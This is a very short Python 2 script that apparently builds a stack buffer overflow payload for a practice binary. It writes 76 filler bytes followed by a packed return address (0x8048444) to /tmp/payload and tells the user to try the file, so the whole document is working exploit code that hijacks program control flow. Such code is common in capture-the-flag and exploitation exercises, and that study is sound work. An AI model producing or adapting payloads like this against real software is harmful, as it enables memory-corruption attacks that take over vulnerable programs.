#!/usr/bin/python

import struct

filepath = "/tmp/payload"

f = open(filepath, "a")
f.write("A" * 76 + struct.pack("I", 0x8048444))
f.close()

print "Try with " + filepath